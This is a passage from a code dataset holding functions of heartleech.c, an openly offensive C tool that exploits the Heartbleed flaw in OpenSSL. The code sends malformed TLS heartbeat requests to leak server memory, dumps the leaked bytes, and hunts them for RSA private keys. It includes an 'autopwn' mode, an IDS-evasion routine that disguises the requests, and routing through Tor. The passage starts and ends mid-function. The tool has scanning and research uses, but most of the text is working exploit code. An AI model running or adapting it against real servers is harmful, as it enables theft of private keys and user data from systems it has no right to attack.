  case 1:\n        if (x != 10) {\n            ERROR_MSG(\"[-] proxy returned unexpected data\\n\");\n            ERROR_MSG(\"[-] %02x:%02x:%02x:%02x:%02x\\n\",\n                foo[0], foo[1], foo[2], foo[3], foo[4]);\n            return -1;\n        } else {\n            struct sockaddr_in sin;\n            sin.sin_family = AF_INET;\n            memcpy(&sin.sin_addr, foo+4, 4);\n            memcpy(&sin.sin_port, foo+8, 2);\n            my_inet_ntop((struct sockaddr*)&sin,\n                         proxy_address, sizeof(proxy_address));\n        }\n        break;\n    case 4:\n        if (x != 22) {\n            ERROR_MSG(\"[-] proxy returned unexpected data\\n\");\n            ERROR_MSG(\"[-] %02x:%02x:%02x:%02x:%02x\\n\",\n                foo[0], foo[1], foo[2], foo[3], foo[4]);\n            return -1;\n        } else {\n            struct sockaddr_in6 sin6;\n            sin6.sin6_family = AF_INET;\n            memcpy(&sin6.sin6_addr, foo+4, 4);\n            memcpy(&sin6.sin6_port, foo+8, 2);\n            my_inet_ntop((struct sockaddr*)&sin6,\n                         proxy_address, sizeof(proxy_address));\n        }\n        break;\n    case 3:\n        if (x < 7 || x != 7 + foo[4]) {\n            ERROR_MSG(\"[-] proxy returned unexpected data\\n\");\n            ERROR_MSG(\"[-] %02x:%02x:%02x:%02x:%02x\\n\",\n                foo[0], foo[1], foo[2], foo[3], foo[4]);\n            return -1;\n        } else {\n            memcpy(proxy_address, foo+5, foo[4]);\n            proxy_address[foo[4]] = '\\0';\n        }\n    default:\n        ERROR_MSG(\"[-] proxy returned unexpected data\\n\");\n            ERROR_MSG(\"[-] %02x:%02x:%02x:%02x:%02x\\n\",\n                foo[0], foo[1], foo[2], foo[3], foo[4]);\n        return -1;\n    }\n\n    DEBUG_MSG(\"[+] proxy connected through: %s:%u\\n\",\n                                                    proxy_address, proxy_port);\n    return 0;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Tests if the named parameter on the command-line. We do a little\n * more than a straight string compare, because I get confused\n * whether parameter have punctuation. Is it \"--excludefile\" or\n * \"--exclude-file\"? I don't know if it's got that dash. Screw it,\n * I'll just make the code so it don't care.\n ******************************************************************************/\n", "func_signal": "static int\nEQUALS(const char *lhs, const char *rhs)", "code": "{\n    for (;;) {\n        while (*lhs == '-' || *lhs == '.' || *lhs == '_')\n            lhs++;\n        while (*rhs == '-' || *rhs == '.' || *rhs == '_')\n            rhs++;\n        if (*lhs == '\\0' && *rhs == '[')\n            return 1; /*arrays*/\n        if (*lhs == '\\0' && *rhs == '=')\n            return 1; /*equals*/\n        if (*lhs == '\\0' && *rhs == ':')\n            return 1; /*equals*/\n        if (tolower(*lhs & 0xFF) != tolower(*rhs & 0xFF))\n            return 0;\n        if (*lhs == '\\0')\n            return 1;\n        lhs++;\n        rhs++;\n    }\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * This is the main threat that creates a TCP connection, negotiates\n * SSL, and then starts sending queries at the server.\n ******************************************************************************/\n", "func_signal": "static int\nssl_thread(const struct DumpArgs *args, struct Target *target)", "code": "{\n    int x;\n    struct addrinfo *addr;\n    ptrdiff_t fd;\n    SSL_CTX* ctx = 0;\n    SSL* ssl = 0;\n    BIO* rbio = 0;\n    BIO* wbio = 0;\n    size_t len;\n    char buf[16384];\n    char address[64];\n    size_t total_bytes = 0;\n    char port[6];\n    time_t started;\n    struct Connection connection[1];\n    const char *hostname;\n\n    memset(connection, 0, sizeof(connection[0]));\n    connection->args = args;\n    connection->target = target;\n\n    /*\n     * If we are doing a proxy, then switch the target hostname\n     * to that of the proxy\n     */\n    if (args->proxy.host) {\n        hostname = args->proxy.host;\n        snprintf(port, sizeof(port), \"%u\", args->proxy.port);\n    } else {\n        hostname = target->hostname;\n        snprintf(port, sizeof(port), \"%u\", target->port);\n    }\n\n\n\n    /*\n     * Do the DNS lookup. A hostname may have multiple IP addresses, so we\n     * print them all for debugging purposes. Normally, we'll just pick\n     * the first address to use, but we allow the user to optionally\n     * select the first IPv4 or IPv6 address with the -v option.\n     */\n    DEBUG_MSG(\"\\n[ ] resolving \\\"%s\\\"\\n\", hostname);\n    x =  getaddrinfo(hostname, port, 0, &addr);\n    if (x != 0) {\n        target->scan_result = Verdict_Inconclusive_NoDNS;\n        return ERROR_MSG(\"[-] %s: DNS lookup failed\\n\", hostname);\n    } else if (is_debug) {\n        struct addrinfo *a;\n        for (a=addr; a; a = a->ai_next) {\n            my_inet_ntop(a->ai_addr, address, sizeof(address));\n            DEBUG_MSG(\"[+]  %s\\n\", address);\n        }\n    }\n    while (addr && args->ip_ver == 4 && addr->ai_family != AF_INET)\n        addr = addr->ai_next;\n    while (addr && args->ip_ver == 6 && addr->ai_family != AF_INET6)\n        addr = addr->ai_next;\n    if (addr == NULL)\n        return ERROR_MSG(\"IPv%u address not found\\n\", args->ip_ver);\n    my_inet_ntop(addr->ai_addr, address, sizeof(address));\n\n\n\n    /*\n     * Create a normal TCP socket\n     */\n    fd = socket(addr->ai_family, SOCK_STREAM, 0);\n    if (fd < 0)\n        return ERROR_MSG(\"%u: could not create socket\\n\", addr->ai_family);\n#if defined(SO_NOSIGPIPE)\n    {\n        int set = 1;\n        setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, (void *)&set, sizeof(int));\n    }\n#endif\n\n    /*\n     * Do a normal TCP connect to the target IP address, sending a SYN and\n     * so on\n     */\n    DEBUG_MSG(\"[ ] %s: connecting...\\n\", address);\n    x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);\n    if (x != 0) {\n        target->scan_result = Verdict_Inconclusive_NoTcp;\n        ERROR_MSG(\"[-] %s: connect failed: %s (%u)\\n\",\n            address, error_msg(WSAGetLastError()), WSAGetLastError());\n        if (target->loop.done == 0)\n            target->loop.desired = 0;\n        sleep(1);\n        return 0;\n    }\n    DEBUG_MSG(\"[+] %s: connected\\n\", address);\n\n\n    /*\n     * If doing a proxy, then do the SOCKS5N connect stuff\n     */\n    if (args->proxy.host) {\n        if (proxy_handshake(fd, args, target) == -1) {\n            ERROR_MSG(\"[-] proxy handshake failed\\n\");\n            if (target->loop.done == 0)\n                target->loop.desired = 0;\n            goto end;\n        }\n    }\n\n\n    /*\n     * If doing STARTTLS, do the negotiation now.\n     */\n    switch (target->starttls) {\n    case APP_NONE:\n        break;\n    case APP_SMTP:\n        if (starttls_smtp(fd, args, target) == -1) {\n            ERROR_MSG(\"[-] starttls handshake failed\\n\");\n            if (target->loop.done == 0)\n                target->loop.desired = 0;\n            goto end;\n        }\n        break;\n    case APP_IMAP4:\n        if (starttls_imap4(fd, args, target) == -1) {\n            ERROR_MSG(\"[-] starttls handshake failed\\n\");\n            if (target->loop.done == 0)\n                target->loop.desired = 0;\n            goto end;\n        }\n        break;\n    case APP_POP3:\n        if (starttls_pop3(fd, args, target) == -1) {\n            ERROR_MSG(\"[-] starttls handshake failed\\n\");\n            if (target->loop.done == 0)\n                target->loop.desired = 0;\n            goto end;\n        }\n        break;\n    case APP_FTP:\n        if (starttls_ftp(fd, args, target) == -1) {\n            ERROR_MSG(\"[-] starttls handshake failed\\n\");\n            if (target->loop.done == 0)\n                target->loop.desired = 0;\n            goto end;\n        }\n        break;\n    default:\n        ERROR_MSG(\"[-] starttls handshake: unknown\\n\");\n        if (target->loop.done == 0)\n            target->loop.desired = 0;\n        goto end;\n    }\n\n    /*\n     * If doing mid-handshake heartbeats, then switch to that\n     */\n    if (args->is_raw > 1) {\n        ssl_thread_raw(fd, args, target, connection);\n        goto end;\n    }\n\n    /*\n     * Initialize SSL structures. Specifically, we initialize them with\n     * \"memory\" BIO instead of normal \"socket\" BIO, because we are handling\n     * the socket communications ourselves, and are just using BIO to\n     * encrypt outgoing buffers and decrypt incoming buffers.\n     */\n    ctx = SSL_CTX_new(SSLv23_client_method());\n    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);\n    ssl = SSL_new(ctx);\n    rbio = BIO_new(BIO_s_mem());\n    wbio = BIO_new(BIO_s_mem());\n    SSL_set_bio(ssl, rbio, wbio);\n    SSL_set_connect_state(ssl);\n    SSL_set_msg_callback(ssl, receive_heartbeat);\n    SSL_set_msg_callback_arg(ssl, (void*)&connection);\n    connection->is_alert = 0;\n\n\n    /*\n     * SSL handshake (rerouting the encryptions). This is an ASYNCHROUNOUS\n     * technique using our own sockets and \"memory BIO\". It's not the normal\n     * use of the API that you'd expect. We have to do do the send()/recv()\n     * ourselves on sockets, then pass then through to the SSL layer\n     */\n    DEBUG_MSG(\"[ ] SSL handshake started...\\n\");\n    target->scan_result = Verdict_Inconclusive_NoSsl;\n    started = time(0);\n    for (;;) {\n\n        /* If we can't finish the SSL handshake in 6 seconds, we probably\n         * never will */\n        if (started + args->timeout < time(0)) {\n            ERROR_MSG(\"[-] timeout waiting for SSL handshake\\n\");\n            if (target->loop.done <= 1)\n                target->loop.desired = 0;\n            goto end;\n        }\n\n        /* If SSL stack wants to send something, then send it out the\n         * TCP/IP stack */\n        len = BIO_pending(wbio);\n        if (len) {\n            if (len > sizeof(buf))\n                len = sizeof(buf);\n            BIO_read(wbio, buf, (int)len);\n            x = send(fd, buf, (int)len, MSG_NOSIGNAL);\n            if (x <= 0) {\n                unsigned err = WSAGetLastError();\n                ERROR_MSG(\"[-] %s:%s send fail: %s (%u)\\n\",\n                          address, port, error_msg(err), err);\n                goto end;\n            }\n        }\n\n        /* If the TCP/IP has received something, then pump the forward\n         * the network data to the SSL stack */\n        x = SSL_connect(ssl);\n        if (x >= 0)\n            break; /* success! */\n        if (x == -1 && SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ) {\n            char buf[16384];\n\n            if (is_incoming_data(fd)) {\n                x = recv(fd, buf, sizeof(buf), 0);\n                if (x > 0) {\n                    BIO_write(rbio, buf, x);\n                } else {\n                    unsigned err = WSAGetLastError();\n                    if (target->loop.done <= 1) {\n                        ERROR_MSG(\"[-] %s (%u)\\n\", error_msg(err), err);\n                        target->loop.desired = 0;\n                        goto end;\n                    } else {\n                        DEBUG_MSG(\"[-] %s (%u)\\n\", error_msg(err), err);\n                        break;\n                    }\n                }\n            }\n        } else {\n            ERROR_MSG(\"[-] %s:%s: SSL handshake failed: %d\\n\",\n                                     address, port, SSL_get_error(ssl, 0));\n            if (target->loop.done <= 1)\n                target->loop.desired = 0;\n            goto end;\n        }\n    }\n    DEBUG_MSG(\"[+] SSL handshake complete [%s]\\n\", SSL_get_cipher(ssl));\n\n\n    /*\n     * Get the peer certificate from the handshake. We do this so that we\n     * can automatically scan the heartbleed information for private key\n     * information\n     */\n    {\n        X509 *cert;\n        char name[512];\n\n        cert = SSL_get_peer_certificate(ssl);\n        if (cert) {\n            parse_cert(cert, name, &target->n, &target->e);\n            X509_free(cert);\n        }\n    }\n\n    /*\n     * If heartbeats are disabled, then early exit\n     */\n    if (ssl->tlsext_heartbeat != 1) {\n        ERROR_MSG(\"[-] target doesn't support heartbeats\\n\");\n        connection->heartbleeds.failed++;\n    }\n\n    if (args->is_raw)\n        ((struct DumpArgs*)args)->is_raw++;\n    \n\n    /*\n     * Loop many times\n     */\nagain:\n    if (connection->heartbleeds.failed) {\n        target->scan_result = Verdict_Safe;\n        target->loop.desired = 0;\n        goto end;\n    }\n    if (connection->heartbleeds.succeeded && args->is_scan) {\n        target->scan_result = Verdict_Vulnerable;\n        target->loop.desired = 0;\n        goto end;\n    }\n    if (target->loop.done++ >= target->loop.desired) {\n        DEBUG_MSG(\"[-] loop-count = 0\\n\");\n        goto end;\n    }\n\n\n    /*\n     * Print how many bytes we've downloaded on command-line every\n     * second (to <stderr>)\n     */\n    print_status(args);\n\n    /*\n     * If we have a buffer, flush it to the file. This may also scan the buffer\n     * for private keys and other useful information\n     */\n    if (connection->buf2_count) {\n        process_bleed(args, connection->buf2, connection->buf2_count,\n                      target->n, target->e);\n        connection_buf_init(connection);\n    }\n\n    /*\n     * [IDS-EVASION]\n     *  In order to evade detection, we prefix the heartbeat request with\n     *  some other data. This can either be an \"Alert/Warning\" at the SSL\n     *  layer, or it could be a an application layer request, such as an\n     *  HTTP GET or SMTP NOOP command.\n     */\n    switch (target->application) {\n    case APP_HTTP:\n        ssl3_write_bytes(ssl,\n                         SSL3_RT_APPLICATION_DATA,\n                         target->http_request,\n                         (int)strlen(target->http_request)-10);\n        break;\n    case APP_SMTP:\n        ssl3_write_bytes(ssl,\n                         SSL3_RT_APPLICATION_DATA,\n                         \"NOOP\\r\\n\",\n                         6);\n        break;\n    case APP_POP3:\n        ssl3_write_bytes(ssl,\n                         SSL3_RT_APPLICATION_DATA,\n                         \"STAT\\r\\n\",\n                         6);\n        break;\n    case APP_IMAP4:\n        ssl3_write_bytes(ssl,\n                         SSL3_RT_APPLICATION_DATA,\n                         \"a001 CAPABILITY\\r\\n\",\n                         17);\n        break;\n    default:\n        /*ssl3_write_bytes(ssl,\n                         SSL3_RT_ALERT,\n                         \"\\x15\\x03\\x02\\x00\\x02\\x01\\x2e\",\n                         7);*/\n        break;\n    }\n\n    /*\n     * [HEARTBEAT]\n     *  Here is where we send the heartbeat request. This is normally a\n     *  \"bleed\" request, but if we haven't gotten any bleed responses, we'll\n     *  instead send a \"beat\" request. A system that responses to beats but\n     *  not bleeds is almost certainly patched.\n     */\n    if (connection->heartbleeds.attempted > 1\n        && connection->heartbleeds.succeeded == 0) {\n        /* we've sent a heartbleeds with no response, therefore try a\n         * normal heartbeat */\n        connection->is_sent_good_heartbeat = 1;\n        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT,\n            \"\\x01\\x00\\x12\"\n            \"aaaaaaaaaaaaaaaa\"\n            \"aaaaaaaaaaaaaaaa\"\n            \"aaaaaaaaaaaaaaaa\"\n            \"aaaaaaaaaaaaaaaa\",\n            67);\n        connection->event.bytes_expecting = 37;\n        connection->event.bytes_received = 0;\n        DEBUG_MSG(\"[ ] probing with good heartbeat\\n\");\n    } else if (args->is_rand_size) {\n        /* If configured to do so, do random sizes */\n        unsigned size = rand();\n        char rbuf[] = \"\\x01\\x00\\x30\"\n        \"aaaaaaaaaaaaaaaa\"\n        \"aaaaaaaaaaaaaaaa\"\n        \"aaaaaaaaaaaaaaaa\"\n        \"aaaaaaaaaaaaaaaa\";\n        if (size <= 128)\n            size = 128;\n        rbuf[0] = 1;\n        rbuf[1] = (char)(size>>8);\n        rbuf[2] = (char)(size>>0);\n        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 37);\n        connection->heartbleeds.attempted++;\n        connection->event.bytes_expecting = size;\n        connection->event.bytes_received = 0;\n    } else {\n        static const char rbuf[] = \"\\x01\\xff\\xff\"\n        \"aaaaaaaaaaaaaaaa\"\n        \"aaaaaaaaaaaaaaaa\"\n        \"aaaaaaaaaaaaaaaa\"\n        \"aaaaaaaaaaaaaaaa\";\n        /* NORMALLY, just send a short heartbeat request */\n        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 37);\n        connection->heartbleeds.attempted++;\n        connection->event.bytes_expecting = 0xFFFF + 3 + 16;\n        connection->event.bytes_received = 0;\n    }\n\n\n\n    /*\n     * Transmit both requests (data and heartbeat) in the same packet\n     */\n    DEBUG_MSG(\"[ ] transmitting requests\\n\");\n    while ((len = BIO_pending(wbio)) != 0) {\n        if (len > sizeof(buf))\n            len = sizeof(buf);\n        BIO_read(wbio, buf, (int)len);\n        x = send(fd, buf, (int)len, MSG_NOSIGNAL);\n        if (x <= 0) {\n            unsigned err = WSAGetLastError();\n            ERROR_MSG(\"[-] %s:%s send fail: %s (%u)\\n\",\n                      address, port, error_msg(err), err);\n            goto end;\n        }\n    }\n\n    /*\n     * Wait for the response. We are actually just waiting for the normal\n     * HTTP-layer response, but during the wait, callbacks to the\n     * \"receive_heartbeat\" function will happen.\n     */\n    DEBUG_MSG(\"[ ] waiting for response\\n\");\n    started = time(0);\n    while (connection->event.bytes_received \n                                        < connection->event.bytes_expecting) {\n        char buf[65536];\n\n        /* if we can an ALERT at the SSL layer, break out of this loop */\n        if (connection->is_alert)\n            goto end;\n\n        /* only wait a few seconds for a response */\n        if (started + args->timeout < time(0)) {\n            DEBUG_MSG(\"[-] timeout waiting for response\\n\");\n            break;\n        }\n\n        /* Use 'select' to poll to see if there is data waiting for us\n         * from the network */\n        if (is_incoming_data(fd)) {\n            x = recv(fd, buf, sizeof(buf), 0);\n            if (x > 0) {\n                total_bytes += x;\n                BIO_write(rbio, buf, x);\n            } else {\n                unsigned err = WSAGetLastError();\n                DEBUG_MSG(\"[-] receive error: %s (%u)\\n\", error_msg(err), err);\n                if (connection->heartbleeds.succeeded == 0 \n                    && target->loop.done <= 2) {\n                    target->application = 0;\n                }\n                goto end;\n            }\n        }\n\n        /*\n         * Use the SSL function to decrypt the data that was put into the\n         * BIO memory buffers above in the sockets.recv()/BIO_write()\n         * combination.\n         */\n        x = SSL_read(ssl, buf, sizeof(buf));\n        if (x < 0 || SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ)\n            ;\n        else if (x < 0) {\n            x = SSL_get_error(ssl, x);\n\n            ERROR_MSG(\"[-] SSL error received\\n\");\n            ERR_print_errors_fp(stderr);\n            break;\n        } else if (x > 0) {\n            DEBUG_MSG(\"[+] %d-bytes data received\\n\", x);\n            if (is_debug)\n            if (memcmp(buf, \"HTTP/1.\", 7) == 0 && strchr(buf, '\\n')) {\n                size_t i;\n                fprintf(stderr, \"[+] \");\n                for (i=0; i<(size_t)x && buf[i] != '\\n'; i++) {\n                    if (buf[i] == '\\r')\n                        continue;\n                    if (isprint(buf[i]&0xFF))\n                        fprintf(stderr, \"%c\", buf[i]&0xFF);\n                    else\n                        fprintf(stderr, \".\");\n                }\n                fprintf(stderr, \"\\n\");\n            }\n        }\n    }\n    goto again;\n\n    /*\n     * We've either reached our loop limit or the other side closed the\n     * connection\n     */\n    DEBUG_MSG(\"[+] connection terminated\\n\");\nend:\n    process_bleed(args, connection->buf2, connection->buf2_count,\n                  target->n, target->e);\n    connection_buf_init(connection);\n    SSL_free(ssl);\n    SSL_CTX_free(ctx);\n    closesocket(fd);\n    return 0;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Called by the configuration-reading function for processing options\n * specified on the command-line, in configuration files, in environmental\n * variables, and so forth.\n ******************************************************************************/\n", "func_signal": "static void\nprint_usage()", "code": "{\n    printf(\"\\n\");\n    printf(\"usage:\\n\");\n    printf(\" heartleech --scanlist <file> [--threads <n>]\\n\");\n    printf(\"   scans the listed targets for heartbleed vulnerability\\n\");\n    printf(\" heartleech <hostname> --dump <file> [--threads <n>]\\n\");\n    printf(\"   aggressively dumps heartbleed info to file for later processing\\n\");\n    printf(\" heartleech --cert <cert> --read <file>\\n\");\n    printf(\"   looks for matching private key in dump file\\n\");\n    printf(\" heartleech <hostname> --autopwn [--threads <n>]\\n\");\n    printf(\"   automatically scans vulnerable host for private key\\n\");\n    printf(\"use '-d' option to debug what's going wrong\\n\");\n    exit(1);\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Use 'select()' to see if there is incoming data on the TCP connection.\n * This is just a typical use of select(), so that we don't block on the\n * socket.\n ******************************************************************************/\n", "func_signal": "static unsigned\nis_incoming_data(int fd)", "code": "{\n    int x;\n    struct timeval tv;\n    fd_set readset;\n    fd_set writeset;\n    fd_set exceptset;\n\n    FD_ZERO(&readset);\n    FD_ZERO(&writeset);\n    FD_ZERO(&exceptset);\n    FD_SET(fd, &readset);\n    FD_SET(fd, &writeset);\n    FD_SET(fd, &exceptset);\n    tv.tv_sec = 0;\n    tv.tv_usec = 1000;\n    x = select((int)fd+1, &readset, NULL, &exceptset, &tv);\n    if (x > 0)\n        return 1; /*true, there's incoming data waiting */\n    else\n        return 0; /* false, nothing has been received */\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * We may want to run many threads on the same target, dumping the contents.\n * To do this, we just create many duplicate versions of the target.\n *\n * The deal is this: when running a scan of a lot of hosts, a single host will\n * just have 1 thread handling it. However, when doing a \"dump\" from a single\n * host, you may want to have multiple threads in order to dump information\n * from that host faster. Thus, we clone the \"target\" record for each\n * thread, making the other parts of the system think it's scanning many\n * hosts when it's really just one.\n ******************************************************************************/\n", "func_signal": "static void\nsplit_targets(struct DumpArgs *args)", "code": "{\n    size_t new_count;\n    struct TargetList *targets = &args->targets;\n    size_t i;\n    \n    if (args->targets.count == 0)\n        return;\n    if (args->threads.desired <= 1)\n        return;\n\n    /* Create one version of the target for each thread */\n    new_count = args->threads.desired * targets->count;\n\n    /* Create a new target list */\n    targets->list = realloc(targets->list, new_count*sizeof(targets->list[0]));\n    targets->max = new_count;\n\n    /* Now make all the copies */\n    for (i=targets->count; i<new_count; i++) {\n        struct Target *new_target = &targets->list[i];\n        struct Target *old_target = &targets->list[i % targets->count];\n\n        memcpy(new_target, old_target, sizeof(*old_target));\n        new_target->hostname = strdup(old_target->hostname);\n    }\n\n    targets->count = new_count;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Parse the command-line, looking for configuration parameters.\n ******************************************************************************/\n", "func_signal": "static void\nread_configuration(struct DumpArgs *args, int argc, char *argv[])", "code": "{\n    int i;\n\n    for (i=1; i<argc; i++) {\n        char c;\n        const char *arg;\n\n        /*\n         * --longform parameters\n         */\n        if (argv[i][0] == '-' && argv[i][1] == '-') {\n            if (strchr(argv[i], '='))\n                arg = strchr(argv[i], '=') + 1;\n            else if (strchr(argv[i], ':'))\n                arg = strchr(argv[i], ':') + 1;\n            else {\n                if (i+1 < argc)\n                    arg = argv[i+1];\n                else\n                    arg = \"\";\n            }\n            if (heartleech_set_parameter(args, argv[i], arg)) {\n                /* these can be of the form either \"--name\" or \"--name value\",\n                 * in which case we'll need to increment the index, because\n                 * the parameter has been consumed */\n                i++;\n            }\n            continue;\n        }\n\n        /* All parameters start with the standard '-'. If it doesn't, then\n         * it's assumed to be the target. Only one target can be specified\n         * on the commandline -- when scanning many targets, they must come\n         * from a file. */\n        if (argv[i][0] != '-') {\n            heartleech_set_parameter(args, \"target\", argv[i]);\n            continue;\n        }\n\n        /*\n         * parameters can be either of two ways:\n         * -twww.google.com\n         * -t www.google.com\n         */\n        c = argv[i][1];\n        if (c == 'd' || c == 'a' || c == 'S' || c == 'h' || c == '?')\n            ;\n        else if (argv[i][2] == '\\0') {\n            arg = argv[++i];\n            if (i >= argc) {\n                fprintf(stderr, \"[-] -%c: missing parameter\\n\", c);\n                exit(1);\n            }\n        } else\n            arg = argv[i] + 2;\n\n        /*\n         * Get the parameter\n         */\n        switch (c) {\n            case 'd': is_debug++; break;\n            case 'a': heartleech_set_parameter(args, \"autopwn\", \"\"); break;\n            case 'c': heartleech_set_parameter(args, \"cert\", arg); break;\n            case 't': heartleech_set_parameter(args, \"target\", arg); break;\n            case 'f': heartleech_set_parameter(args, \"dump\", arg); break;\n            case 'F': heartleech_set_parameter(args, \"read\", arg); break;\n            case 'l': heartleech_set_parameter(args, \"loop\", arg); break;\n            case 'p': heartleech_set_parameter(args, \"port\", arg); break;\n            case 'S': heartleech_set_parameter(args, \"rand\", arg); break;\n            case 'v': heartleech_set_parameter(args, \"ipver\", arg); break;\n            case '?': heartleech_set_parameter(args, \"help\", arg); break;\n            case 'h': heartleech_set_parameter(args, \"help\", arg); break;\n            case 'H': heartleech_set_parameter(args, \"help\", arg); break;\n            default:\n                fprintf(stderr, \"[-] -%c: unknown argument\\n\", c);\n                exit(1);\n        }\n    }\n\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Parse a network address, converting the text form into a binary form.\n * Note that this is designed for use with the Sock5n implementation, so\n * it's not a general purpose function.\n ******************************************************************************/\n", "func_signal": "static size_t\nmy_inet_pton(const char *hostname,\n                unsigned char *dst, size_t offset, size_t max,\n                unsigned char *type)", "code": "{\n    size_t len;\n\n\n#if defined(WIN32)\n    if (max-offset >= sizeof(struct sockaddr_in)) {\n        struct sockaddr_in sin;\n\n        if (inet_pton(AF_INET, hostname, (struct sockaddr*)&sin) == 1) {\n            memcpy(&dst[offset], &sin.sin_addr, 4);\n            *type = 1; /* socks5 type = IPv4 */\n            return offset + 4;\n        }\n    }\n#else\n    if (max-offset >= 4\n        && inet_pton(AF_INET, hostname, &dst[offset]) == 1) {\n        *type = 1; /* socks5 type = IPv4 */\n        return offset + 4;\n    }\n#endif\n\n#if defined(WIN32)\n    if (max-offset >= 16) {\n        struct sockaddr_in6 sin6;\n        if (inet_pton(AF_INET6, hostname, (struct sockaddr*)&sin6) == 1) {\n            memcpy(&dst[offset], &sin6.sin6_addr, 16);\n            *type = 4; /* socks5 type = IPv6*/\n            return offset + 16;\n        }\n    }\n#else\n    if (max-offset >= 16\n        && inet_pton(AF_INET6, hostname, &dst[offset]) == 1) {\n        *type = 4; /* socks5 type = IPv6*/\n        return offset + 16;\n    }\n#endif\n\n    len = strlen(hostname);\n    if (offset + len + 1 <= max) {\n        dst[offset] = (unsigned char)len;\n        memcpy(&dst[offset+1], hostname, len);\n    }\n    *type = 3; /*socks5 type = domainname */\n    return offset + len + 1;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Called by the configuration-reading function for processing options\n * specified on the command-line, in configuration files, in environmental\n * variables, and so forth.\n ******************************************************************************/\n", "func_signal": "static unsigned\nheartleech_set_parameter(struct DumpArgs *args,\n                            const char name[], const char value[])", "code": "{\n    if (EQUALS(\"autopwn\", name)) {\n        args->is_auto_pwn = 1;\n        return 0;\n    } else if (EQUALS(\"cert\", name)) {\n        if (args->cert_filename) {\n            fprintf(stderr, \"certificate file already specified: %s\\n\",\n                    args->cert_filename);\n            free(args->cert_filename);\n        }\n        args->cert_filename = (char*)malloc(strlen(value)+1);\n        memcpy(args->cert_filename, value, strlen(value)+1);\n        return 1;\n    } else if (EQUALS(\"dump\", name)) {\n        if (args->dump_filename) {\n            fprintf(stderr, \"dump file already specified: %s\\n\",\n                    args->dump_filename);\n            free(args->dump_filename);\n        }\n        args->dump_filename = (char*)malloc(strlen(value)+1);\n        memcpy(args->dump_filename, value, strlen(value)+1);\n        args->op = Op_Dump;\n        return 1;\n    } else if (EQUALS(\"help\", name)) {\n        print_usage();\n        return 0;\n    } else if (EQUALS(\"ipv4\", name)) {\n        args->ip_ver = 4;\n        return 0;\n    } else if (EQUALS(\"ipv6\", name)) {\n        args->ip_ver = 6;\n        return 0;\n    } else if (EQUALS(\"ipver\", name)) {\n        unsigned long x = strtoul(value, 0, 0);\n        switch (x) {\n            case 4: heartleech_set_parameter(args, \"ipv4\", \"\"); break;\n            case 6: heartleech_set_parameter(args, \"ipv6\", \"\"); break;\n            default:\n                fprintf(stderr, \"%lu: unknown IP version (must be 4 or 6)\\n\",\n                        x);\n                exit(1);\n        }\n        return 1;\n    } else if (EQUALS(\"loop\", name) || EQUALS(\"loops\", name)) {\n        if (!isdigit(value[0] & 0xFF))\n            fprintf(stderr, \"loop: bad value: %s\\n\", value);\n        else {\n            args->cfg_loopcount = strtoul(value, 0, 0);\n        }\n        return 1;\n    } else if (EQUALS(\"port\", name)) {\n        if (!isdigit(value[0] & 0xFF) || strtoul(value, 0, 0) > 65535) {\n            fprintf(stderr, \"loop: bad value: %s\\n\", value);\n            exit(1);\n        } else {\n            args->default_port = strtoul(value, 0, 0);\n        }\n        return 1;\n    } else if (EQUALS(\"proxy\", name)) {\n        unsigned port_index;\n        unsigned host_index = 0;\n        unsigned host_length;\n\n        /* Find port spec, if there is one */\n        if (value[0] == '[' && strchr(value, ']')) {\n            port_index = strchr(value, ']') - value;\n            host_index = 1;\n        } else if (strrchr(value, ':'))\n            port_index = strrchr(value, ':') - value;\n        else\n            port_index = strlen(value);\n        host_length = port_index - host_index;\n\n        /* allocate name for proxy host */\n        if (args->proxy.host) {\n            fprintf(stderr, \"[-] proxy specified more than once\\n\");\n            free(args->proxy.host);\n        }\n        args->proxy.host = (char*)malloc(host_length + 1);\n        memcpy(args->proxy.host, &value[host_index], host_length + 1);\n        args->proxy.host[host_length] = '\\0';\n\n        /* parse port */\n        while (value[port_index] && ispunct(value[port_index]&0xFF))\n            port_index++;\n        args->proxy.port = strtoul(&value[port_index], 0, 0);\n\n        if (args->proxy.port == 0 || args->proxy.port > 65535)\n            args->proxy.port = 9150; /* default for Tor */\n\n        return 1;\n    } else if (EQUALS(\"rand\", name)) {\n        args->is_rand_size = 1;\n        return 0; /* no 'value' argument */\n    } else if (EQUALS(\"raw\", name)) {\n        args->is_raw = 1;\n        return 0; /* no 'value' argument */\n    } else if (EQUALS(\"read\", name)) {\n        if 